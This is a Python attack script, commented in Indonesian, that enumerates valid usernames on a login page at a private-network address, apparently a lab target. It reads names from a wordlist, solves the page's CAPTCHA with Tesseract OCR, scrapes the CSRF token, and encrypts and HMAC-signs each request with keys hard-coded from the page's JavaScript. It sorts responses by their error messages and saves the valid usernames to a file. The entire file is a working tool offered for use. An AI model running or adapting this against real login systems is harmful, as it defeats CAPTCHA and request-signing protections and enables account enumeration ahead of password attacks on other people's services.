import requests
from PIL import Image
from io import BytesIO
from bs4 import BeautifulSoup
import base64
import json
import time
import hmac
import hashlib
import re
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from urllib.parse import urljoin
import pytesseract
import os

# === SETTING WINDOWS ===
pytesseract.pytesseract.tesseract_cmd = r'C:\Program Files\Tesseract-OCR\tesseract.exe'

# === KONFIGURASI ===
url_login = 'http://192.168.70.202:3333/login6.php'
CAPTCHA_URL = urljoin(url_login, 'captcha.php')
username_file = 'username-wordlists.txt'
password_dummy = '123456'
DELAY = 5

# === KUNCI SESUAI login6.php JS ===
AES_KEY = b'a3f5b2c1493e7d1a'
AES_IV = b'b86c5ed2b9c17e2f'
HMAC_SECRET = b'V8tK9AqL7zRw3XyZ'

session = requests.Session()

default_headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    'Referer': url_login,
    'Origin': url_login,
    'X-Requested-With': 'XMLHttpRequest'
}

# === Fungsi Enkripsi dan Signature ===
def encrypt_payload(data_json):
    cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
    padded = pad(data_json.encode('utf-8'), AES.block_size)
    return base64.b64encode(cipher.encrypt(padded)).decode()

def hmac_sha256(message):
    return hmac.new(HMAC_SECRET, message.encode(), hashlib.sha256).hexdigest()

# === CAPTCHA Resolver Tanpa Preprocessing ===
def solve_captcha(session):
    os.makedirs("captcha_debug", exist_ok=True)
    for attempt in range(3):
        try:
            response = session.get(CAPTCHA_URL, stream=True)
            img = Image.open(BytesIO(response.content))
            filename = f"captcha_debug/original_{attempt + 1}.png"
            img.save(filename)

            text = pytesseract.image_to_string(
                img,
                config='--psm 6 --oem 3 -c tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
            )
            clean_text = re.sub(r'[^A-Z0-9]', '', text.upper())
            print(f"[CAPTCHA Attempt {attempt + 1}] Result: {clean_text}")
            if len(clean_text) >= 4:
                return clean_text[:6]
        except Exception as e:
            print(f"[!] CAPTCHA error: {str(e)}")
            time.sleep(1)
    return "FAILED"

# === Ambil CSRF + CAPTCHA ===
def get_captcha_and_csrf(username, password):
    try:
        r = session.get(url_login, headers=default_headers)
        soup = BeautifulSoup(r.text, 'html.parser')

        token_tag = soup.find('input', {'id': 'csrf_token'})
        token = token_tag.get('value') if token_tag else None

        captcha = solve_captcha(session)
        if captcha == "FAILED":
            print(f"[!] CAPTCHA gagal dikenali setelah 3 percobaan.")
            return None, None

        return captcha, token
    except Exception as e:
        print(f"[!] Exception CAPTCHA parse: {e}")
        return None, None

# === Load daftar username ===
with open(username_file, 'r', encoding='utf-8') as f:
    usernames = [line.strip() for line in f if line.strip()]

print("\n🔍 Memulai brute force validasi username...\n")

# === Loop brute username ===
for username in usernames:
    print(f"🧪 Menguji username: {username}")
    captcha, csrf_token = get_captcha_and_csrf(username, password_dummy)

    if not captcha or not csrf_token:
        print(f"[!] CAPTCHA/CSRF gagal untuk {username}, skip.")
        time.sleep(DELAY)
        continue

    payload = {
        'username': username,
        'password': password_dummy,
        'captcha': captcha,
        'csrf_token': csrf_token
    }

    json_data = json.dumps(payload)
    encrypted = encrypt_payload(json_data)
    signature = hmac_sha256(encrypted)

    headers = {
        **default_headers,
        'Content-Type': 'text/plain',
        'X-Signature': signature
    }

    try:
        resp = session.post(url_login, headers=headers, data=encrypted)
        body = resp.text.lower()
    except Exception as e:
        print(f"[!] POST error: {e}")
        time.sleep(5)
        continue

    if "user tidak ditemukan" in body:
        print(f"[×] USER TIDAK DITEMUKAN: {username}")
    elif "password salah" in body:
        print(f"[✓] VALID USERNAME: {username}")
        with open("valid_usernames.txt", "a") as f:
            f.write(f"{username}\n")
    elif "captcha" in body:
        print(f"[!] CAPTCHA salah meskipun OCR: '{captcha}'")
    else:
        print(f"[?] Respons tidak dikenali:\n{body}")

    time.sleep(DELAY)

print("\n✅ Brute force username selesai.")
